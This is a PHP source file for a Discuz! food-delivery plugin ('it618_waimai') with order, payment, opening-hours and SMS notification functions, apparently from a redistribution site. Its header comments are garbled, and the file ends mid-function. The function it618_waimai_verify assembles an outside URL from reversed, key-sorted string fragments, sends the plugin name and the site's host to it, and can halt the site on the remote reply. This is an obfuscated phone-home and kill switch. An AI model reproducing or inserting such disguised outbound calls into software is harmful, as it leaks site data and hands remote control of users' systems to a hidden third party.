<?php
/*
 * CopyRight  : [DisM!] (C)2001-2099 DisM Inc.
 * Created on : 2020-02-11,11:00:52
 * Author     : DisM!Ӧ������ dism.taobao.com $
 * Description: This is NOT a freeware, use is subject to license terms.
 * ����Դ��Դ�������ռ�,��������ѧϰ����������������ҵ��;����������24Сʱ��ɾ��!
 * ����ַ�������Ȩ��,�뼰ʱ��֪����,���Ǽ���ɾ��!
 */
 
if(!defined('IN_DISCUZ')) {
	exit('Access Denied');
}

global $_G;

$it618_waimai = $_G['cache']['plugin']['it618_waimai'];
require_once DISCUZ_ROOT.'./source/plugin/it618_waimai/lang.func.php';

$creditname=$_G['setting']['extcredits'][$it618_waimai['waimai_credit']]['title'];
if($it618_waimai['waimai_levelnames']!=''){
	$waimai_levelnames=$it618_waimai['waimai_levelnames'];
}else{
	$waimai_levelnames=$it618_waimai_lang['t332'];
}
$tmplevelarr=explode(",",$waimai_levelnames);

function it618_waimai_pay($type,$title){
	if(!file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php')){
		$paystr=$tmpstr.'<span id="payli"></span>';
		return $paystr;
	}
	require_once DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php';
	$tmpstr=getpaytype();
	
	$tmparr=explode("it618getpaytype",$tmpstr);
	if(count($tmparr)>1){
		$tmpstr=$tmparr[0];
		
		if($type=='gwcwap'){
			$paystr='<table width="100%" class="gwctable" id="payli" bgcolor="#FFFFFF">
					<tr><td><table width="100%">
					<tr class="gwctrtitle">
					<th style="padding-left:5px">'.$title.'</th>
					</tr>
					</table></td></tr><tr><td style="padding:3px;padding-top:18px;padding-bottom:15px">
					'.$tmpstr.'
					</td></tr></table>';
		}
	}else{
		$paystr=$tmpstr.'<span id="payli"></span>';
	}
    
	return $paystr;
}

function it618_waimai_qrxf($saleid){
	global $_G,$it618_waimai,$it618_waimai_lang;
	
	$it618_waimai_gwcsale_main=C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($saleid);
		
	C::t('#it618_waimai#it618_waimai_gwcsale_main')->update($saleid,array(
		'it618_state' => 5
	));
	
	C::t('#it618_waimai#it618_waimai_sale')->update_it618_state_by_gwcid($saleid);
	
	C::t('common_member_count')->increase($it618_waimai_gwcsale_main['it618_uid'], array(
		'extcredits'.$it618_waimai['waimai_credit'] => $it618_waimai_gwcsale_main['it618_zsscore'])
	);
	
	if($it618_waimai_gwcsale_main['it618_rwpmid']>0){
		$it618_waimai_rwpeiman=C::t('#it618_waimai#it618_waimai_rwpeiman')->fetch_by_id($it618_waimai_gwcsale_main['it618_rwpmid']);
		$money=$it618_waimai_gwcsale_main['it618_yunfei'];
		$tcmoney=round(($money*$it618_waimai_gwcsale_main['it618_rwtcbl']/100),2);
		
		$it618_bz=$it618_waimai_lang['s1384'];
		$it618_bz=str_replace("{money}",$money,$it618_bz);
		$it618_bz=str_replace("{saleid}",$saleid,$it618_bz);
		$it618_bz=str_replace("{tcmoney}",$tcmoney,$it618_bz);
		
		require_once DISCUZ_ROOT.'./source/plugin/it618_credits/function.func.php';
		savemoney(array(
			'it618_uid' => $it618_waimai_rwpeiman['it618_uid'],
			'it618_type' => 'zy',
			'it618_money1' => $tcmoney,
			'it618_bz' => $it618_bz,
			'it618_zytype' => 'it618_waimai_tc',
			'it618_zyid' => $saleid,
			'it618_time' => $_G['timestamp']
		));
	}
	
	$tmpmoney=$it618_waimai_gwcsale_main['it618_money']+$it618_waimai_gwcsale_main['it618_yunfei']-$it618_waimai_gwcsale_main['it618_mjmoney'];
		
	if($tmpmoney>0){
		if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_union/config/saleset.php')){
			require_once DISCUZ_ROOT.'./source/plugin/it618_union/config/saleset.php';
		}
		
		if($union_waimai_isok==1&&$tmpmoney>=$union_waimai_money){
			require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
			Union_SaleTC('it618_waimai',$tmpmoney,$it618_waimai_gwcsale_main['id'],$it618_waimai_gwcsale_main['it618_uid']);
		}
	}
	
	it618_waimai_sendmessage('saleok_user',$saleid);
}

function it618_waimai_getyytime($it618_waimai_waimai){
	global $_G,$it618_waimai_lang;
	
	$yytime_isok=C::t('#it618_waimai#it618_waimai_set')->getsetvalue_by_setname('yytime_isok');
	
	$timetmp=date('Y-m-d', $_G['timestamp']);
			
	if($yytime_isok==1){
		$isok=1;
		if(is_array($it618_waimai_waimai)){
			if($it618_waimai_waimai['it618_isok']==1){
				$it618_isoktime=$it618_waimai_waimai['it618_isoktime'];
				if($it618_isoktime!=""){
					$isok=2;
	
					$timearr=explode(',',$it618_isoktime);
					for($i=0;$i<count($timearr);$i++){
						$timearr1=explode("-",$timearr[$i]);
						
						$timetmp1=$timetmp." ".$timearr1[0].":00";
						$timetmp2=$timetmp." ".$timearr1[1].":59";
						
						if(strtotime($timetmp1)<=$_G['timestamp']&&strtotime($timetmp2)>=$_G['timestamp']){
							$isok=1;
							break;
						}
						
						if(strtotime($timetmp1)>$_G['timestamp']){
							$oktimearr[$timearr1[0]]=strtotime($timetmp1);
						}
						$oktimearr1[$timearr1[0]]=strtotime($timetmp1);
					}
					
					if($isok==2){
						if(count($oktimearr)>0){
							asort($oktimearr);
							$oktimetmp=array_keys($oktimearr);
							$oktime=$oktimetmp[0];
						}else{
							asort($oktimearr1);
							$oktimetmp=array_keys($oktimearr1);
							$oktime=$it618_waimai_lang['s761'].$oktimetmp[0];
						}
						
						$oktime2=$oktimearr[$oktimetmp[0]];
						$isokbz=$oktime.$it618_waimai_lang['s763'];
					}
				}else{
					$isok=1;
				}
			}else{
				$isok=31;
				$isokbz=$it618_waimai_waimai['it618_isokbz'];
			}
		}
		
		if($isok==1||$isok==2){
			$yytime_isoktime=C::t('#it618_waimai#it618_waimai_set')->getsetvalue_by_setname('yytime_isoktime');
	
			if($yytime_isoktime!=""){
				if($isok==1){
					$isok=2;

					unset($oktimearr);
					$timearr=explode(',',$yytime_isoktime);
					for($i=0;$i<count($timearr);$i++){
						$timearr1=explode("-",$timearr[$i]);
						
						$timetmp1=$timetmp." ".$timearr1[0].":00";
						$timetmp2=$timetmp." ".$timearr1[1].":59";
						
						if(strtotime($timetmp1)<=$_G['timestamp']&&strtotime($timetmp2)>=$_G['timestamp']){
							$isok=1;
							break;
						}
						
						if(strtotime($timetmp1)>$_G['timestamp']){
							$oktimearr[$timearr1[0]]=strtotime($timetmp1);
						}
						$oktimearr1[$timearr1[0]]=strtotime($timetmp1);
					}
					
					if($isok==2){
						if(count($oktimearr)>0){
							asort($oktimearr);
							$oktimetmp=array_keys($oktimearr);
							$oktime=$oktimetmp[0];
						}else{
							asort($oktimearr1);
							$oktimetmp=array_keys($oktimearr1);
							$oktime=$it618_waimai_lang['s761'].$oktimetmp[0];
						}
						
						$isokbz=$oktime.$it618_waimai_lang['s763'];
						
						if($oktime2>$oktimearr[$oktimetmp[0]]){
							$isokbz=$oktime.$it618_waimai_lang['s763'];
						}
					}
				}else{
					unset($oktimearr);
					$timearr=explode(',',$yytime_isoktime);
					for($i=0;$i<count($timearr);$i++){
						$timearr1=explode("-",$timearr[$i]);
						
						$timetmp1=$timetmp." ".$timearr1[0].":00";
						
						if(strtotime($timetmp1)>$oktime2){
							$oktimearr[$timearr1[0]]=strtotime($timetmp1);
						}
					}
					
					if(count($oktimearr)>0){
						asort($oktimearr);
						$oktimetmp=array_keys($oktimearr);
						$oktime=$oktimetmp[0];
						$isokbz=$oktime.$it618_waimai_lang['s763'];
					}
				}
				
			}else{
				$isok=1;
			}
		}
	}else{
		$isok=32;
		$yytime_isokbz=C::t('#it618_waimai#it618_waimai_set')->getsetvalue_by_setname('yytime_isokbz');
		$isokbz=$yytime_isokbz;
	}
	
	return $isok."it618_split".$isokbz;
}

function it618_waimai_getsalestate(){
	global $it618_waimai_lang;
	
	$salestate='<option value=1 style="color:red">'.$it618_waimai_lang['s1190'].'</option>
			<option value=2 style="color:red">'.$it618_waimai_lang['s1191'].'</option>
			<option value=3 style="color:blue">'.$it618_waimai_lang['s1192'].'</option>
			<option value=4 style="color:blue">'.$it618_waimai_lang['s1193'].'</option>
			<option value=41 style="color:green">'.$it618_waimai_lang['s1198'].'</option>
			<option value=5 style="color:green">'.$it618_waimai_lang['s1194'].'</option>
			<option value=6 style="color:purple">'.$it618_waimai_lang['s1195'].'</option>
			<option value=7 style="color:purple">'.$it618_waimai_lang['s1196'].'</option>
			<option value=8 style="color:#FF00FF">'.$it618_waimai_lang['s1197'].'</option>';
	
	return $salestate;
}

function it618_waimai_classname($pid){
	$it618_waimai_goods = C::t('#it618_waimai#it618_waimai_goods')->fetch_by_id($pid);
	$classname=C::t('#it618_waimai#it618_waimai_class')->fetch_it618_classname_by_id($it618_waimai_goods['it618_class_id']);
	
	return $classname;
}

function it618_waimai_delsalework(){
	DB::query("delete from ".DB::table('it618_waimai_salework'));
}

function it618_waimai_verify(){
	global $plugin;
	$plugin['identifier']='it618_waimai';
	$plugin['url']=$_SERVER['HTTP_HOST'];
	$var = array();
	$var['g'] = strrev('30249//:');
	$var['b'] = substr($_SERVER[REQUEST_SCHEME],0,4);
	$var['p'] = '/verify.php?';
	$var['j'] = strrev('piv.');
	ksort($var,2);
	$url=implode($var);
	$query=json_decode(dfsockopen($url,0,$plugin),true);
 	if($query) {
		if($query['code']==1)$_SESSION['authcode']=true;
		else exit(''.$query['msg'].'');
	}
		return $url;
}

function it618_waimai_sendmessage($type,$id,$type1=''){	
	global $_G,$it618_waimai_lang;
	$it618_members = $_G['cache']['plugin']['it618_members'];
	if (!file_exists(DISCUZ_ROOT.'./source/plugin/it618_waimai/message.php'))return;
	require DISCUZ_ROOT.'./source/plugin/it618_waimai/message.php';
	
	$urlarr=explode("https://",$_G['siteurl']);
	if(count($urlarr)==1)$httpstr='http://';else $httpstr='https://';
	$url_this = $httpstr.$_SERVER ['HTTP_HOST'].'/';
	
	$tmpurl=it618_waimai_getrewrite('waimai_wap','u@0','plugin.php?id=it618_waimai:wap&pagetype=u');
	
	if($it618_isok==1){
		
		if($it618_isok_admin==1){
			if($type=='rz_admin'&&$it618_body_rz_admin_isok==1){
				$tel=$it618_tel_admin;
				$Body=$it618_body_rz_admin;
				
				$it618_waimai_waimai = C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($id);
				
				$uid=$it618_uid_admin;
				$tplid_wxsms=$it618_body_rz_admin_tplid_wxsms;
				$body_wxsms=$it618_body_rz_admin_wxsms;
				if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
					$param_wxsms=array();
					$tmparr=explode("@",$body_wxsms);
					for($i=0;$i<count($tmparr);$i++){
						$tmparr1=explode("|",$tmparr[$i]);
						$tmplabel=$tmparr1[0];
						$tmpvalue=$tmparr1[1];
						
						$tmpvalue=str_replace("{user}",it618_waimai_getusername($it618_waimai_waimai['it618_uid']),$tmpvalue);
						
						$param_wxsms[$tmplabel]=array();
						$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
						$param_wxsms[$tmplabel]["color"]="#666666";
					}
				}
				
				$ALDYBody=$Body;
				$Body=str_replace("{user}",it618_waimai_getusername($it618_waimai_waimai['it618_uid']),$Body);
				
				if($it618_type!='smsbao'){
					$tplid=$it618_body_rz_admin_tplid;
					
					$tmparr=explode("{user}",$ALDYBody);
					if(count($tmparr)>1)$param.='"user":"'.it618_waimai_getusername($it618_waimai_waimai['it618_uid']).'",';
					
					if($param!=''){
						$param.='@';
						$param=str_replace(",@","",$param);
					}
				}
			}
			
			if($type=='sqpm_admin'&&$it618_body_sqpm_admin_isok==1){
				$tel=$it618_tel_admin;
				$Body=$it618_body_sqpm_admin;	
				
				$it618_waimai_rwpeiman = C::t('#it618_waimai#it618_waimai_rwpeiman')->fetch_by_id($id);
				
				$uid=$it618_uid_admin;
				$tplid_wxsms=$it618_body_sqpm_admin_tplid_wxsms;
				$body_wxsms=$it618_body_sqpm_admin_wxsms;
				if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
					$param_wxsms=array();
					$tmparr=explode("@",$body_wxsms);
					for($i=0;$i<count($tmparr);$i++){
						$tmparr1=explode("|",$tmparr[$i]);
						$tmplabel=$tmparr1[0];
						$tmpvalue=$tmparr1[1];
						
						$tmpvalue=str_replace("{user}",it618_waimai_getusername($it618_waimai_rwpeiman['it618_uid']),$tmpvalue);
						
						$param_wxsms[$tmplabel]=array();
						$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
						$param_wxsms[$tmplabel]["color"]="#666666";
					}
				}	

				$ALDYBody=$Body;
				
				$Body=str_replace("{user}",it618_waimai_getusername($it618_waimai_rwpeiman['it618_uid']),$Body);
				
				if($it618_type!='smsbao'){
					$tplid=$it618_body_sqpm_admin_tplid;
					
					$tmparr=explode("{user}",$ALDYBody);
					if(count($tmparr)>1)$param.='"user":"'.it618_waimai_getusername($it618_waimai_rwpeiman['it618_uid']).'",';
					
					if($param!=''){
						$param.='@';
						$param=str_replace(",@","",$param);
					}
				}

			}
			
			if($type=='tx_admin'&&$it618_body_tx_admin_isok==1){
				$tel=$it618_tel_admin;
				$Body=$it618_body_tx_admin;
				$it618_waimai_tx = C::t('#it618_waimai#it618_waimai_tx')->fetch_by_id($id);
				$it618_waimai_waimai = C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($it618_waimai_tx['it618_shopid']);
				
				$uid=$it618_uid_admin;
				$tplid_wxsms=$it618_body_tx_admin_tplid_wxsms;
				$body_wxsms=$it618_body_tx_admin_wxsms;
				if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
					$param_wxsms=array();
					$tmparr=explode("@",$body_wxsms);
					for($i=0;$i<count($tmparr);$i++){
						$tmparr1=explode("|",$tmparr[$i]);
						$tmplabel=$tmparr1[0];
						$tmpvalue=$tmparr1[1];
						
						$tmpvalue=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$tmpvalue);
						$tmpvalue=str_replace("{txmoney}",$it618_waimai_tx['it618_price'],$tmpvalue);
						
						$param_wxsms[$tmplabel]=array();
						$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
						$param_wxsms[$tmplabel]["color"]="#666666";
					}
				}
				
				$ALDYBody=$Body;
				$Body=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$Body);
				$Body=str_replace("{txmoney}",$it618_waimai_tx['it618_price'],$Body);
				
				if($it618_type!='smsbao'){
					$tplid=$it618_body_tx_admin_tplid;
					
					$tmparr=explode("{shopname}",$ALDYBody);
					if(count($tmparr)>1)$param.='"shopname":"'.$it618_waimai_waimai['it618_name'].'",';
					
					$tmparr=explode("{txmoney}",$ALDYBody);
					if(count($tmparr)>1)$param.='"txmoney":"'.$it618_waimai_tx['it618_price'].'",';
					
					if($param!=''){
						$param.='@';
						$param=str_replace(",@","",$param);
					}
				}
			}
			
			if($type=='sale_admin'&&$it618_body_sale_admin_isok==1){
				$tel=$it618_tel_admin;
				$Body=$it618_body_sale_admin;	
				
				$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
				$it618_waimai_waimai=C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($it618_waimai_gwcsale_main['it618_shopid']);
				
				$uid=$it618_uid_admin;
				$tplid_wxsms=$it618_body_sale_admin_tplid_wxsms;
				$body_wxsms=$it618_body_sale_admin_wxsms;
				if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
					$param_wxsms=array();
					$tmparr=explode("@",$body_wxsms);
					for($i=0;$i<count($tmparr);$i++){
						$tmparr1=explode("|",$tmparr[$i]);
						$tmplabel=$tmparr1[0];
						$tmpvalue=$tmparr1[1];
						
						$tmpvalue=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$tmpvalue);
						$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
						$tmpvalue=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$tmpvalue);
						$tmpvalue=str_replace("{count}",$it618_waimai_gwcsale_main['it618_count'],$tmpvalue);
						$tmpvalue=str_replace("{money}",$it618_waimai_gwcsale_main['it618_money'],$tmpvalue);
						$tmpvalue=str_replace("{yunfei}",$it618_waimai_gwcsale_main['it618_yunfei'],$tmpvalue);
						$tmpvalue=str_replace("{scoremoney}",$it618_waimai_gwcsale_main['it618_scoremoney'],$tmpvalue);
						
						$param_wxsms[$tmplabel]=array();
						$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
						$param_wxsms[$tmplabel]["color"]="#666666";
					}
				}	

				$ALDYBody=$Body;
				
				$Body=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$Body);
				$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
				$Body=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$Body);
				$Body=str_replace("{count}",$it618_waimai_gwcsale_main['it618_count'],$Body);
				$Body=str_replace("{money}",$it618_waimai_gwcsale_main['it618_money'],$Body);
				$Body=str_replace("{yunfei}",$it618_waimai_gwcsale_main['it618_yunfei'],$Body);
				$Body=str_replace("{scoremoney}",$it618_waimai_gwcsale_main['it618_scoremoney'],$Body);
				
				if($it618_type!='smsbao'){
					$tplid=$it618_body_sale_admin_tplid;
					
					$tmparr=explode("{user}",$ALDYBody);
					if(count($tmparr)>1)$param.='"user":"'.it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']).'",';
					
					$tmparr=explode("{saleid}",$ALDYBody);
					if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
					
					$tmparr=explode("{shopname}",$ALDYBody);
					if(count($tmparr)>1)$param.='"shopname":"'.$it618_waimai_waimai['it618_name'].'",';
					
					$tmparr=explode("{count}",$ALDYBody);
					if(count($tmparr)>1)$param.='"count":"'.$it618_waimai_gwcsale_main['it618_count'].'",';
					
					$tmparr=explode("{money}",$ALDYBody);
					if(count($tmparr)>1)$param.='"money":"'.$it618_waimai_gwcsale_main['it618_money'].'",';
					
					$tmparr=explode("{yunfei}",$ALDYBody);
					if(count($tmparr)>1)$param.='"yunfei":"'.$it618_waimai_gwcsale_main['it618_yunfei'].'",';
					
					$tmparr=explode("{scoremoney}",$ALDYBody);
					if(count($tmparr)>1)$param.='"scoremoney":"'.$it618_waimai_gwcsale_main['it618_scoremoney'].'",';
					
					if($param!=''){
						$param.='@';
						$param=str_replace(",@","",$param);
					}
				}

			}
			
			if($type=='salesqfahuo_admin'&&$it618_body_salesqfahuo_admin_isok==1){
				$tel=$it618_tel_admin;
				$Body=$it618_body_salesqfahuo_admin;
				
				$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
				$it618_waimai_waimai=C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($it618_waimai_gwcsale_main['it618_shopid']);
				
				$uid=$it618_uid_admin;
				$tplid_wxsms=$it618_body_salesqfahuo_admin_tplid_wxsms;
				$body_wxsms=$it618_body_salesqfahuo_admin_wxsms;
				if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
					$param_wxsms=array();
					$tmparr=explode("@",$body_wxsms);
					for($i=0;$i<count($tmparr);$i++){
						$tmparr1=explode("|",$tmparr[$i]);
						$tmplabel=$tmparr1[0];
						$tmpvalue=$tmparr1[1];
						
						$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
						$tmpvalue=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$tmpvalue);
						
						$param_wxsms[$tmplabel]=array();
						$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
						$param_wxsms[$tmplabel]["color"]="#666666";
					}
				}
	
				$ALDYBody=$Body;
				$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
				$Body=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$Body);
				
				if($it618_type!='smsbao'){
					$tplid=$it618_body_salesqfahuo_admin_tplid;
					
					$tmparr=explode("{saleid}",$ALDYBody);
					if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
					
					$tmparr=explode("{shopname}",$ALDYBody);
					if(count($tmparr)>1)$param.='"shopname":"'.$it618_waimai_waimai['it618_name'].'",';
					
					if($param!=''){
						$param.='@';
						$param=str_replace(",@","",$param);
					}
				}
			}
			
			if($type=='saletuihuo_admin'&&$it618_body_saletuihuo_admin_isok==1){
				$tel=$it618_tel_admin;
				$Body=$it618_body_saletuihuo_admin;
				
				$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
				
				$uid=$it618_uid_admin;
				$tplid_wxsms=$it618_body_saletuihuo_admin_tplid_wxsms;
				$body_wxsms=$it618_body_saletuihuo_admin_wxsms;
				if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
					$param_wxsms=array();
					$tmparr=explode("@",$body_wxsms);
					for($i=0;$i<count($tmparr);$i++){
						$tmparr1=explode("|",$tmparr[$i]);
						$tmplabel=$tmparr1[0];
						$tmpvalue=$tmparr1[1];
						
						$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
						$tmpvalue=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$tmpvalue);
						
						$param_wxsms[$tmplabel]=array();
						$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
						$param_wxsms[$tmplabel]["color"]="#666666";
					}
				}
	
				$ALDYBody=$Body;
				$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
				$Body=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$Body);
				
				if($it618_type!='smsbao'){
					$tplid=$it618_body_saletuihuo_admin_tplid;
					
					$tmparr=explode("{saleid}",$ALDYBody);
					if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
					
					$tmparr=explode("{user}",$ALDYBody);
					if(count($tmparr)>1)$param.='"user":"'.it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']).'",';
					
					if($param!=''){
						$param.='@';
						$param=str_replace(",@","",$param);
					}
				}
			}
		}
		
		if($type=='tx_shop'&&$it618_body_tx_shop_isok==1){
			$it618_waimai_tx = C::t('#it618_waimai#it618_waimai_tx')->fetch_by_id($id);
			$it618_waimai_waimai = C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($it618_waimai_tx['it618_shopid']);
			
			$tel=$it618_waimai_waimai['it618_messagetel'];
			$Body=$it618_body_tx_shop;
			
			if($it618_waimai_waimai['it618_messageisok']==1){
				$uid=$it618_waimai_waimai['it618_uid'];
				$tplid_wxsms=$it618_body_tx_shop_tplid_wxsms;
				$body_wxsms=$it618_body_tx_shop_wxsms;
				if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
					$param_wxsms=array();
					$tmparr=explode("@",$body_wxsms);
					for($i=0;$i<count($tmparr);$i++){
						$tmparr1=explode("|",$tmparr[$i]);
						$tmplabel=$tmparr1[0];
						$tmpvalue=$tmparr1[1];
						
						$tmpvalue=str_replace("{txmoney}",$it618_waimai_tx['it618_price'],$tmpvalue);
						
						$param_wxsms[$tmplabel]=array();
						$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
						$param_wxsms[$tmplabel]["color"]="#666666";
					}
				}
				
				$ALDYBody=$Body;
				$Body=str_replace("{txmoney}",$it618_waimai_tx['it618_price'],$Body);
				
				if($it618_type!='smsbao'){
					$tplid=$it618_body_tx_shop_tplid;
					
					$tmparr=explode("{txmoney}",$ALDYBody);
					if(count($tmparr)>1)$param.='"txmoney":"'.$it618_waimai_tx['it618_price'].'",';
					
					if($param!=''){
						$param.='@';
						$param=str_replace(",@","",$param);
					}
				}
			}
		}
		
		if($type=='sale_shop'&&$it618_body_sale_shop_isok==1){
			$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
			$it618_waimai_waimai = C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($it618_waimai_gwcsale_main['it618_shopid']);
	
			$tel=$it618_waimai_waimai['it618_messagetel'];
			$Body=$it618_body_sale_shop;
			
			if($it618_waimai_waimai['it618_messageisok']==1){				
				$uid=$it618_waimai_waimai['it618_uid'];
				$tplid_wxsms=$it618_body_sale_shop_tplid_wxsms;
				$body_wxsms=$it618_body_sale_shop_wxsms;
				if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
					$param_wxsms=array();
					$tmparr=explode("@",$body_wxsms);
					for($i=0;$i<count($tmparr);$i++){
						$tmparr1=explode("|",$tmparr[$i]);
						$tmplabel=$tmparr1[0];
						$tmpvalue=$tmparr1[1];
						
						$tmpvalue=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$tmpvalue);
						$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
						$tmpvalue=str_replace("{count}",$it618_waimai_gwcsale_main['it618_count'],$tmpvalue);
						$tmpvalue=str_replace("{money}",$it618_waimai_gwcsale_main['it618_money'],$tmpvalue);
						
						$param_wxsms[$tmplabel]=array();
						$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
						$param_wxsms[$tmplabel]["color"]="#666666";
					}
				}
				
				$ALDYBody=$Body;
				
				$Body=str_replace("{user}",it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']),$Body);
				$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
				$Body=str_replace("{count}",$it618_waimai_gwcsale_main['it618_count'],$Body);
				$Body=str_replace("{money}",$it618_waimai_gwcsale_main['it618_money'],$Body);
				
				if($it618_type!='smsbao'){
					$tplid=$it618_body_sale_shop_tplid;
					
					$tmparr=explode("{user}",$ALDYBody);
					if(count($tmparr)>1)$param.='"user":"'.it618_waimai_getusername($it618_waimai_gwcsale_main['it618_uid']).'",';
					
					$tmparr=explode("{saleid}",$ALDYBody);
					if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
					
					$tmparr=explode("{count}",$ALDYBody);
					if(count($tmparr)>1)$param.='"count":"'.$it618_waimai_gwcsale_main['it618_count'].'",';
					
					$tmparr=explode("{money}",$ALDYBody);
					if(count($tmparr)>1)$param.='"money":"'.$it618_waimai_gwcsale_main['it618_money'].'",';
					
					if($param!=''){
						$param.='@';
						$param=str_replace(",@","",$param);
					}
				}
			}
		}
		
		if($type=='salefahuo_shop'&&$it618_body_salefahuo_shop_isok==1){
			$it618_waimai_gwcsale_main = C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($id);
			$it618_waimai_waimai = C::t('#it618_waimai#it618_waimai_waimai')->fetch_by_id($it618_waimai_gwcsale_main['it618_shopid']);
			$it618_waimai_peiman=C::t('#it618_waimai#it618_waimai_peiman')->fetch_by_pmid($it618_waimai_gwcsale_main['it618_pmid']);
			
			$tel=$it618_waimai_waimai['it618_messagetel'];
			$Body=$it618_body_salefahuo_shop;
			
			if($it618_waimai_waimai['it618_messageisok']==1){
				$uid=$it618_waimai_waimai['it618_uid'];
				$tplid_wxsms=$it618_body_salefahuo_shop_tplid_wxsms;
				$body_wxsms=$it618_body_salefahuo_shop_wxsms;
				if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
					$param_wxsms=array();
					$tmparr=explode("@",$body_wxsms);
					for($i=0;$i<count($tmparr);$i++){
						$tmparr1=explode("|",$tmparr[$i]);
						$tmplabel=$tmparr1[0];
						$tmpvalue=$tmparr1[1];
						
						$tmpvalue=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$tmpvalue);
						$tmpvalue=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$tmpvalue);
						$tmpvalue=str_replace("{pmid}",$it618_waimai_peiman['it618_pmid'],$tmpvalue);
						$tmpvalue=str_replace("{pmname}",$it618_waimai_peiman['it618_name'],$tmpvalue);
						$tmpvalue=str_replace("{pmtel}",$it618_waimai_peiman['it618_tel'],$tmpvalue);
						
						$param_wxsms[$tmplabel]=array();
						$param_wxsms[$tmplabel]["value"]=it618_waimai_gbktoutf($tmpvalue);
						$param_wxsms[$tmplabel]["color"]="#666666";
					}
				}
	
				$ALDYBody=$Body;
				$Body=str_replace("{saleid}",$it618_waimai_gwcsale_main['id'],$Body);
				$Body=str_replace("{shopname}",$it618_waimai_waimai['it618_name'],$Body);
				$Body=str_replace("{pmid}",$it618_waimai_peiman['it618_pmid'],$Body);
				$Body=str_replace("{pmname}",$it618_waimai_peiman['it618_name'],$Body);
				$Body=str_replace("{pmtel}",$it618_waimai_peiman['it618_tel'],$Body);
				
				if($it618_type!='smsbao'){
					$tplid=$it618_body_salefahuo_shop_tplid;
					
					$tmparr=explode("{saleid}",$ALDYBody);
					if(count($tmparr)>1)$param.='"saleid":"'.$it618_waimai_gwcsale_main['id'].'",';
					
					$tmparr=explode("{shopname}",$ALDYBody);
					if(count($tmparr)>1)$param.='"shopname":"'.$it618_waimai_waimai['it618_name'].'",';
					
					$tmparr=explode("{pmid}",$ALDYBody);
					if(count($tmparr)>1)$param.='"pmid":"'.$it618_waimai_peiman['it618_pmid'].'",';
					
					$tmparr=explode("{pmname}",$ALDYBody);
					if(count($tmparr)>1)$param.='"pmname":"'.$it618_waimai_peiman['it618_name'].'",';
					
					$tmparr=explode("{pmtel}",$ALDYBody);
					if(count($tmparr)>1)$param.='"pmtel":"'.$it618_waimai_peiman['it618_tel'].'",';
					
